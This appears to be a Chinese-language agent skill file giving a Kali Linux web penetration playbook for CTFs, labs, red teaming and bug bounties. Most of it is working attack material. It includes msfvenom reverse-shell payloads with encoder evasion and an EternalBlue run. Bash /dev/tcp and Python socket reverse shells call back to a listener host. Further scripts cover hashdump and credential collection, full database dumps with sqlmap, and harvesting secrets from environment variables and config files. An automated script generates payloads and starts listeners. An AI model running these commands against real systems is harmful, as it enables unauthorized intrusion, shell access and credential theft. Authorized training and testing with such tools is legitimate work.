---
name: kali-web-penetration
version: 1.0
platform: Kali Linux 2024+
description: Kali Linux 原生优化的 Web 渗透测试技能。充分利用 Kali 预装工具生态，提供端到端的快速渗透框架。从信息收集、漏洞发现、利用、权限提升到后渗透的完整自动化工作流。使用场景：(1) CTF Web 题目快速通关 (2) 实际靶场渗透 (3) 红队评估 (4) 漏洞赏金计划。
---

# Kali Linux Web 渗透技能 - 快速渗透框架

## 概述

本技能充分利用 Kali Linux 预装的 **250+ 渗透工具**，打造一套**开箱即用的快速渗透框架**。以**效率和自动化**为核心，覆盖**信息收集 → 漏洞发现 → 利用 → 权限提升 → 后渗透**的完整流程。

核心特点：
- ✅ **0 配置**：Kali 自带，无需额外安装
- ✅ **高自动化**：Bash/Python 脚本深度集成
- ✅ **快速迭代**：从扫描到 getshell 最快 5 分钟
- ✅ **工具链整合**：充分利用 Metasploit、Burp、Sqlmap 等

---

## 0. Kali 环境快速配置

### 0.1 必要的初始化

```bash
# 更新工具库
sudo apt update && sudo apt upgrade -y

# 安装关键补充包
sudo apt install -y python3-pip git curl wget netcat-openbsd

# Python 依赖
pip3 install requests beautifulsoup4 paramiko pwntools

# 验证关键工具
which nmap sqlmap burpsuite metasploit-framework
nmap --version
msfconsole --version
```

### 0.2 Kali 工具快速查询

```bash
# 查看 Kali 预装工具列表（按分类）
apt list --installed 2>/dev/null | grep -E "sqlmap|nmap|burp|metasploit"

# 查看特定工具的快捷路径
which msfvenom msfconsole sqlmap nmap gobuster
```

### 0.3 常用快捷别名配置

```bash
# 添加到 ~/.bashrc 或 ~/.zshrc
alias scan_target='nmap -sS -sV -sC -p- -oA'
alias sqli_test='sqlmap -u'
alias wordlist_dir='/usr/share/wordlists'
alias payloads_dir='/usr/share/metasploit-framework/modules/payloads'

# 自定义快速扫描函数
function quick_scan() {
    echo "[*] 快速扫描 $1..."
    nmap -sS -sV -p- $1 -oA scan_$1 &
    wafw00f $1 &
    whatweb $1
}

# 使用：quick_scan 192.168.1.100
```

---

## 1. Kali 中的信息收集 - 快速侦查

### 1.1 一体化扫描 (Metasploit DB)

Kali 中 Metasploit 是核心，利用其内置数据库加速：

```bash
# 启动 MSF 数据库服务
sudo service postgresql start
msfdb init  # 首次使用

# 端口扫描 + 服务识别 + 漏洞检查（一行命令）
msfconsole -q -x "db_status; use auxiliary/scanner/nmap/nmap; \
set RHOSTS 192.168.1.0/24; set ARGUMENTS '-sS -sV -p-'; \
run; exit"
```

### 1.2 快速指纹识别

```bash
# Whatweb - Kali 原生指纹识别（推荐）
whatweb -a 3 http://target | tee fingerprint.txt

# Wappalyzer 命令行版本（Kali 自带）
wappalyzer http://target

# Nikto - Web 服务器检测（Kali 内置，快速）
nikto -h target -o nikto_report.html
```

### 1.3 目录爆破 - Kali 优化方案

Kali 预装了多个字典和工具，优化组合：

```bash
# 【第1层】超快速探针 (Gobuster - Kali 原生，最快)
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt \
  -t 50 -q --no-progress

# 【第2层】深度爆破 (Dirbuster - Kali 原生 GUI + CLI)
# CLI 方式
dirbuster -l /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
  -u http://target -t 50

# 【第3层】递归爆破 (Feroxbuster - 最全面)
feroxbuster -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -C 404 -x php,html,jsp,aspx --auto-tune

# 【快速字典选择】
ls /usr/share/wordlists/          # Kali 默认字典目录
# ├─ dirb/                         # Web 目录
# ├─ dirbuster/                    # 大型字典
# ├─ rockyou.txt (gzip)            # 密码字典
# ├─ metasploit/                   # MSF 字典
# └─ ftp-betterdefaultpasslist     # 默认密码
```

### 1.4 WAF 检测与识别

```bash
# Wafw00f - Kali 原生 WAF 检测
wafw00f http://target -v

# Curl + HTTP 特征识别（快速）
curl -I http://target | grep -E "Server|X-Powered-By|CloudFlare"

# identywaf - 识别 WAF 产品
identywaf http://target
```

### 1.5 源码泄露与敏感文件发现

```bash
# 【git 泄露】
curl -s http://target/.git/config

# 【自动化泄露检测】- Kali 脚本
for path in .git .svn .hg WEB-INF web.xml .env .aws credentials; do
  echo "[*] 检查 /$path"
  curl -s -o /dev/null -w "%{http_code}" http://target/$path
done

# 【GitDumper - 自动化 git 恢复】(Kali 内置)
gitdumper http://target/.git/ ./target_git_dump
cd target_git_dump && git log --all --oneline
```

### 1.6 子域名枚举 - 快速发现

```bash
# Subfinder - Kali 原生，多源整合
subfinder -d target.com -v

# Amass - Kali 强力工具（深度侦查）
amass enum -d target.com -o subs.txt

# DNSMap - 字典爆破（快速）
dnsmap target.com -w /usr/share/wordlists/dnsmap/namelist.txt
```

### 1.7 一体化信息收集框架

```bash
#!/bin/bash
# 将此脚本保存为 /usr/local/bin/quick_recon.sh，加执行权限

TARGET=$1
OUTPUT_DIR="recon_${TARGET}_$(date +%s)"
mkdir -p $OUTPUT_DIR

echo "[*] === 快速侦查 $TARGET ==="

# 1. 端口扫描 (3分钟)
echo "[*] 步骤1: 端口扫描..."
nmap -sS -sV -p- $TARGET -oA $OUTPUT_DIR/nmap_full &

# 2. 指纹识别 (1分钟)
echo "[*] 步骤2: 指纹识别..."
whatweb -a 3 $TARGET > $OUTPUT_DIR/whatweb.txt &

# 3. WAF 检测 (30秒)
echo "[*] 步骤3: WAF 检测..."
wafw00f $TARGET > $OUTPUT_DIR/waf.txt &

# 4. 目录爆破 (3分钟，使用小字典快速探针)
echo "[*] 步骤4: 目录爆破..."
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt \
  -t 50 -q -o $OUTPUT_DIR/dirs.txt &

wait
echo "[+] 侦查完成，结果保存到 $OUTPUT_DIR"
ls -la $OUTPUT_DIR
```

使用：
```bash
chmod +x /usr/local/bin/quick_recon.sh
quick_recon.sh 192.168.1.100
```

---

## 2. Kali 中的漏洞扫描 - 自动化优先

### 2.1 Metasploit 漏洞扫描

Metasploit 是 Kali 的皇冠工具，利用其强大的扫描模块：

```bash
# 【方式1】交互式扫描
msfconsole -q
msf> use auxiliary/scanner/http/web_application_scanner
msf> set RHOSTS http://target
msf> run

# 【方式2】非交互式一行命令
msfconsole -q -x "use auxiliary/scanner/nessus/nessus_scan; \
set RHOSTS 192.168.1.0/24; run; exit"

# 【方式3】Metasploit 漏洞数据库查询
msfconsole -q -x "db_status; hosts; services; creds; exit"
```

### 2.2 Sqlmap - SQL 注入自动化

```bash
# 【快速检测】
sqlmap -u "http://target/page?id=1" --batch --random-agent

# 【WAF 绕过 + 提取数据】
sqlmap -u "http://target/page?id=1" \
  --tamper=space2comment,between \
  --dbs --batch

# 【完整脱库】
sqlmap -u "http://target/page?id=1" \
  -D database_name -T users \
  --dump --batch

# 【从 Burp 导入请求文件】
sqlmap -r burp_request.txt --batch --dbs
```

### 2.3 Burp Suite 被动扫描集成

Kali 原生包含 Burp Suite Community，可无缝集成：

```bash
# 启动 Burp（本地代理 8080）
burpsuite &

# Burp 命令行（Pro 版）
java -jar burpsuite_pro.jar --batch-scan http://target \
  --config-file /usr/share/burp/default.json
```

### 2.4 一体化自动化漏洞扫描框架

```python
#!/usr/bin/env python3
"""
Kali 原生漏洞扫描框架
使用所有预装工具进行自动化扫描
"""
import subprocess
import json
from pathlib import Path
from datetime import datetime

class KaliVulnScanner:
    def __init__(self, target):
        self.target = target
        self.output_dir = Path(f"vulnscan_{target.replace('://', '_')}_{datetime.now().strftime('%s')}")
        self.output_dir.mkdir(exist_ok=True)
        self.results = {}
    
    def run_nmap_vuln_scan(self):
        """Nmap 漏洞脚本扫描"""
        cmd = f"nmap --script vuln -sV -p- {self.target} -oA {self.output_dir}/nmap_vuln"
        print(f"[*] Nmap 漏洞扫描...")
        subprocess.run(cmd, shell=True)
    
    def run_sqlmap(self):
        """Sqlmap SQL 注入检测"""
        cmd = f"sqlmap -u '{self.target}' --batch --forms"
        print(f"[*] Sqlmap 检测...")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        self.results['sqlmap'] = result.stdout
    
    def run_nikto(self):
        """Nikto Web 服务器扫描"""
        cmd = f"nikto -h {self.target} -o {self.output_dir}/nikto.html"
        print(f"[*] Nikto 扫描...")
        subprocess.run(cmd, shell=True)
    
    def run_wpscan(self):
        """WordPress 扫描（如果是 WordPress 站点）"""
        cmd = f"wpscan --url {self.target} --random-user-agent -e ap,at,u"
        print(f"[*] WPScan 扫描...")
        subprocess.run(cmd, shell=True, capture_output=True)
    
    def run_joomla_scan(self):
        """Joomla 扫描"""
        cmd = f"joomscan -u {self.target}"
        print(f"[*] JoomScan 扫描...")
        subprocess.run(cmd, shell=True, capture_output=True)
    
    def run_all(self):
        """运行所有扫描"""
        self.run_nmap_vuln_scan()
        self.run_sqlmap()
        self.run_nikto()
        self.run_wpscan()
        self.run_joomla_scan()
        
        # 生成报告
        self.generate_report()
    
    def generate_report(self):
        """生成扫描报告"""
        with open(self.output_dir / "report.json", "w") as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\n[+] 扫描完成！结果保存到：{self.output_dir}")

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost"
    scanner = KaliVulnScanner(target)
    scanner.run_all()
```

使用：
```bash
python3 kali_vuln_scanner.py http://target.com
```

---

## 3. Kali 中的漏洞利用 - Metasploit 深度集成

### 3.1 Metasploit RCE 快速利用

```bash
# 【模式1】已知漏洞快速利用
msfconsole -q << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit
EOF

# 【模式2】Java 反序列化 (Weblogic/JBoss)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.jsp

# 【模式3】.NET 反序列化
ysoserial.net -g ObjectDataProvider -f Json -c "whoami" | base64

# 【模式4】快速 Reverse Shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
```

### 3.2 Msfvenom - 一体化 Payload 生成

```bash
# Windows
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o shell.exe

# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f elf -o shell.elf

# PHP
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f raw -o shell.php

# Python
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f raw -o shell.py

# 列出所有可用 payload
msfvenom -l payloads | grep reverse_tcp
```

### 3.3 快速 Listener 设置

```bash
# Metasploit Multi Handler（推荐）
msfconsole -q << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit
EOF

# Netcat（极速）
nc -nvlp 4444

# 结合 Bash：更好的交互
bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
```

### 3.4 Post-Exploitation 自动化

```bash
# Metasploit Post 模块自动化
msfconsole -q << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit -j

# 当获得 session 后自动运行 post 模块
use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/gather/enum_logged_in_users
set SESSION 1
run
EOF
```

---

## 4. Kali 中的权限提升 - 自动化工具

### 4.1 Linux 权限提升

```bash
# 【工具1】LinEnum - Kali 预装（推荐）
cd /usr/share/exploitdb/exploits/linux/local
./31545.sh > /tmp/linenum.txt

# 【工具2】linePriv（自动化）
wget https://github.com/initstring/linePriv/raw/master/linepriv.py
python3 linepriv.py --full

# 【工具3】自动化脚本 - Kali 风格】
#!/bin/bash
echo "[*] 检查 sudo 权限"
sudo -l 2>/dev/null

echo "[*] 寻找 SUID 二进制"
find / -perm -4000 -type f 2>/dev/null | head -20

echo "[*] 检查内核版本（CVE-2021-22555 等）"
uname -r

echo "[*] 检查 Docker/容器逃逸"
docker ps 2>/dev/null || echo "未安装"
```

### 4.2 Windows 权限提升

```bash
# Kali 中生成 Windows 提升工具
# WinPEAS - Windows 提升检查器
wget https://github.com/carlospolop/PEASS-ng/releases/download/20240101/winPEAS.bat

# Metasploit Potato 漏洞利用
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -o payload.exe

# 使用 RoguePotato/JuicyPotato 等
# 上传后运行：RoguePotato.exe -r 127.0.0.1 -e cmd.exe
```

---

## 5. Kali 中的后渗透 - 自动化框架

### 5.1 Metasploit Post 模块集合

```bash
# 【自动化凭证提取】
msfconsole -q << 'EOF'
use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/gather/credentials/credential_collector
set SESSION 1
run

# 【自动化密钥搜索】
use post/windows/gather/enum_shares
set SESSION 1
run
EOF

# 【Linux 后渗透】
msfconsole -q << 'EOF'
use post/linux/gather/hashdump
set SESSION 1
run

use post/linux/gather/enum_system
set SESSION 1
run
EOF
```

### 5.2 交互式 Shell - 权限维持

```bash
# Metasploit Shell 升级（从 netcat 到 meterpreter）
# 在目标获得 bash shell 后：
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('192.168.1.10',4444));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
p=subprocess.Popen(['/bin/sh','-i']);p.wait()"

# 或使用 Kali 预装的 Empire/Starkiller
# 高级 C2 框架，可持久化控制
```

### 5.3 数据提取 - 自动化脚本

```bash
#!/bin/bash
# 从 webshell 或获得的 shell 中提取数据

echo "[*] 提取系统信息"
uname -a
whoami
id

echo "[*] 提取敏感文件"
cat /etc/passwd
cat ~/.ssh/authorized_keys
find / -name "*.conf" -type f 2>/dev/null | head -20

echo "[*] 提取环境变量（凭证）"
env | grep -i "api\|secret\|key\|pass"

echo "[*] 提取历史命令"
history | tail -50
```

---

## 6. Kali 特色工具集成 - 高级利用

### 6.1 Burp Suite 自动化

```bash
# 【Burp 扫描 + 自动利用】
burpsuite --batch-scan http://target \
  --config-file /usr/share/burp/burp_config.json \
  --user-config-file /home/user/.burp/burp_config.json

# 【从 Burp 导出结果自动化利用】
# 导出 Issue List -> CSV -> 自动化验证和利用
```

### 6.2 Social Engineering Toolkit (SET)

```bash
# Kali 原生社工工具
setoolkit

# 自动化钓鱼邮件 + 恶意链接
# 可配合 Metasploit 实现 2-in-1 利用
```

### 6.3 Wireshark + Tshark 流量分析

```bash
# 【实时抓包】
sudo tshark -i eth0 -Y 'http.request' -T fields \
  -e http.request.method \
  -e http.request.uri \
  -e http.request.full_uri

# 【导出 HTTP 流】
tshark -r capture.pcap -Y http.request \
  -T fields -e http.request.uri > urls.txt

# 【搜索敏感数据】
tshark -r capture.pcap -Y 'http.response.body contains "password"'
```

### 6.4 Hashcat - GPU 加速破解

```bash
# Kali 原生 GPU 破解
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# 组合攻击
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt \
  --rules=/usr/share/hashcat/rules/best64.rule

# 掩码攻击
hashcat -m 1000 hashes.txt -a 3 ?d?d?d?d
```

---

## 7. Kali 快速渗透工作流

### 7.1 【5分钟快速通关 CTF Web】

```bash
# 1. 快速侦查 (1分钟)
quick_recon.sh http://target

# 2. 漏洞检测 (2分钟)
sqlmap -u "http://target/page?id=1" --batch --dbs
nikto -h http://target

# 3. 漏洞利用 (1分钟)
# 如果是 RCE，直接 webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php

# 4. Getshell + 获取 Flag (1分钟)
# 上传 shell.php，建立 Listener，执行 cat /flag
```

### 7.2 【30分钟完整红队评估】

```
00:00 - 快速侦查 (5分钟)
  → quick_recon.sh target

05:00 - 深度扫描 (10分钟)
  → nmap 全扫描 + Burp 被动扫描 + Sqlmap 检测

15:00 - 漏洞利用 (10分钟)
  → 生成 payload + 上传 webshell + 建立 Listener

25:00 - 权限提升 (5分钟)
  → 运行 LinEnum/WinPEAS + 尝试已知漏洞

30:00 - 总结报告
  → 生成最终评估报告
```

### 7.3 【Kali 一体化渗透脚本】

```bash
#!/bin/bash
# 保存为 /usr/local/bin/kali_pentest.sh

TARGET=$1
LHOST=$2
LPORT=${3:-4444}

if [ $# -lt 2 ]; then
    echo "用法: kali_pentest.sh <target> <lhost> [lport]"
    exit 1
fi

OUTPUT_DIR="pentest_${TARGET}_$(date +%s)"
mkdir -p $OUTPUT_DIR

echo "[*] === Kali 快速渗透 ==="
echo "[*] 目标: $TARGET"
echo "[*] 反连: $LHOST:$LPORT"
echo ""

# 1. 侦查
echo "[1/5] 快速侦查..."
quick_recon.sh $TARGET > $OUTPUT_DIR/recon.log 2>&1

# 2. 漏洞扫描
echo "[2/5] 漏洞扫描..."
(
  nmap --script vuln -sV -p- $TARGET -oA $OUTPUT_DIR/nmap_vuln &
  nikto -h $TARGET -o $OUTPUT_DIR/nikto.html &
  sqlmap -u "http://$TARGET" --batch --forms -o $OUTPUT_DIR/sqlmap.log &
) &
wait

# 3. Payload 生成
echo "[3/5] 生成 Payload..."
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  -f raw -o $OUTPUT_DIR/shell.php

msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o $OUTPUT_DIR/shell.exe

# 4. Listener
echo "[4/5] 启动 Listener..."
msfconsole -q << EOF > $OUTPUT_DIR/listener.log 2>&1 &
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
exploit -j
EOF

# 5. 报告
echo "[5/5] 生成报告..."
cat > $OUTPUT_DIR/README.txt << EOF
Kali 渗透测试报告
目标: $TARGET
时间: $(date)
目录: $OUTPUT_DIR

文件说明:
- recon.log      : 侦查结果
- nmap_vuln*     : Nmap 漏洞扫描
- nikto.html     : Web 服务器扫描
- sqlmap.log     : SQL 注入测试
- shell.php      : PHP Payload
- shell.exe      : Windows Payload
- listener.log   : Listener 日志

使用 Payload:
1. PHP: http://<upload_point>/shell.php
2. Windows: 执行 shell.exe 后自动反连
3. 监听: msfconsole 中已启动 handler

后续步骤:
1. 上传 payload 到目标
2. 触发执行
3. 在 msfconsole 中获得 session
4. use post/windows/gather/hashdump 提取凭证
5. 进行权限提升和数据提取
EOF

echo "[+] 渗透框架已启动！"
echo "[+] 结果保存到: $OUTPUT_DIR"
echo "[+] 使用 msfconsole 查看 listener 状态"
```

使用：
```bash
chmod +x /usr/local/bin/kali_pentest.sh
kali_pentest.sh http://target 192.168.1.10 4444
```

---

## 8. Kali 调试与故障排查

### 8.1 常见问题

| 问题 | 原因 | 解决 |
|------|------|------|
| `msfconsole: command not found` | 未安装 MSF | `sudo apt install metasploit-framework` |
| `postgresql: cannot connect` | 数据库未启动 | `sudo service postgresql start` |
| `Shellcode size is too large` | payload 过大 | 使用 staged 或 encoding |
| `Reverse shell 无法连接` | 防火墙/NAT | 检查 LHOST 和 LPORT；尝试 bind shell |

### 8.2 调试技巧

```bash
# 详细输出
msfconsole -d

# 测试 payload 连接
nc -nvlp 4444

# 验证防火墙规则
sudo iptables -L -n | grep 4444
sudo ufw status
```

---

## 9. Kali 工具快速参考

### 9.1 按用途分类的快速命令

```bash
# 【信息收集】
nmap -sS -sV -p- target          # 端口扫描
whatweb target                    # 指纹识别
gobuster dir -u target -w dict    # 目录爆破
amass enum -d domain.com          # 子域名枚举

# 【漏洞扫描】
sqlmap -u url --batch             # SQL 注入
nikto -h target                    # Web 服务器
nmap --script vuln target          # 漏洞脚本
msfconsole -q (use scanner)        # MSF 扫描

# 【漏洞利用】
msfvenom -p payload -f format      # Payload 生成
msfconsole << 'EOF' ... EOF        # 快速利用
exploit/multi/handler              # Listener

# 【权限提升】
sudo -l                            # 检查 sudo
find / -perm -4000                 # SUID 二进制
uname -r                           # 内核版本

# 【后渗透】
post/windows/gather/*              # 凭证提取
find / -name "*.conf"              # 配置文件
env | grep -i pass                 # 环境变量
```

### 9.2 Kali 工具生态全景

```
Kali 工具链（250+ 工具）
├─ 信息收集
│  ├─ nmap, masscan, naabu
│  ├─ whatweb, wappalyzer
│  ├─ gobuster, dirbuster, feroxbuster
│  ├─ subfinder, amass, dnsmap
│  └─ nikto, wpscan, joomscan
│
├─ 漏洞扫描
│  ├─ metasploit, burpsuite
│  ├─ sqlmap, xsstrike
│  ├─ nmap (vuln scripts)
│  └─ openvas, nikto
│
├─ 漏洞利用
│  ├─ metasploit (exploit modules)
│  ├─ searchsploit (ExploitDB)
│  ├─ msfvenom (payload generator)
│  └─ ysoserial (Java反序列化)
│
├─ 权限提升
│  ├─ linEnum, linepriv
│  ├─ winpeas, jaws
│  └─ exploit-db (local exploits)
│
├─ 后渗透
│  ├─ metasploit (post modules)
│  ├─ empire, starkiller
│  ├─ hashcat, john
│  └─ impacket
│
└─ 辅助工具
   ├─ burp, wireshark, tshark
   ├─ curl, wget, netcat
   ├─ ssh, sftp, scp
   └─ aircrack-ng (无线)
```

---

## 10. Kali 快速启动清单

```bash
# 【Day 1 Setup】
sudo apt update && sudo apt upgrade -y
msfdb init
burpsuite &
echo "alias recon='quick_recon.sh'" >> ~/.bashrc

# 【快速扫描模板】
TEMPLATE="
[*] 快速侦查: quick_recon.sh TARGET
[*] 深度扫描: nmap -A -p- TARGET
[*] Web 检测: nikto -h TARGET
[*] SQL 注入: sqlmap -u URL --batch
[*] Payload : msfvenom -p PAYLOAD -f FORMAT
[*] Listener: msfconsole -q << EOF ...
"

# 【快速参考】
echo "$TEMPLATE" | tee ~/.kali_quick_ref.txt
```

---

## 总结

Kali Linux 是**开箱即用的渗透测试平台**，本技能充分利用其：

✅ **预装 250+ 工具** - 无需额外安装  
✅ **深度 Metasploit 集成** - 从扫描到利用到后渗透  
✅ **高自动化脚本** - 从侦查到获取 Flag  
✅ **快速工作流** - 5 分钟快速通关 CTF  

**核心概念**：  
Information Gathering → Vulnerability Scanning → Exploitation → Privilege Escalation → Post-Exploitation → Report

**推荐学习路径**：
1. 掌握基础命令（1-2 周）
2. 完整渗透流程（3-4 周）
3. 高级技巧和自动化（5-8 周）
4. 红队评估实战（持续）

---

**版本**: 1.0  
**平台**: Kali Linux 2024+  
**维护**: Security Team  
